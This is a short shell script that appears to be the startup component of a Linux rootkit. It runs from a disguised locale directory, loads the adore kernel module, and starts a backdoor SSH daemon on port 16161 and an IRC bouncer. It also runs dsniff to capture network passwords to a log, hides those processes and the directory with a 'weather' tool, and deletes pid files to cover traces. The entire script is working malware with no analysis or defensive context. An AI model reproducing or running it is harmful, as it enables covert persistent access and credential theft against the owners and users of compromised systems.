#!/bin/sh
DIR="/usr/lib/locale/ro_RO/uboot"
cd $DIR
if [ -f hide.log ]; then
 rm -f hide.log
fi

if [ -f pid.afbackup ]; then
 rm -f pid.afbackup
fi

if [ -f pid.bnc ]; then
 rm -f pid.bnc
fi

/sbin/insmod adore.o >>/dev/null 2>&1;
/sbin/insmod cleaner.o >>/dev/null 2>&1;
/sbin/rmmod cleaner >>/dev/null 2>&1;


./afbackup -q -p 16161 -f $DIR/sshd_conf -h $DIR/hostkey >>/dev/null 2>&1
/usr/bin/weather i `cat pid.afbackup` >>./hide.log 2>&1


./bnc >>/dev/null 2>&1
/usr/bin/weather i `cat pid.bnc` >>./hide.log 2>&1

./sniff/sbin/dsniff -c -i eth0 -n -w $DIR/sniff/sniff.log >>/dev/null 2>&1 &
/usr/bin/weather i `/sbin/pidof dsniff` >>./hide.log 2>&1

/usr/bin/weather h $DIR >>./hide.log 2>&1
rm -f /*pid* >>/dev/null 2>&1
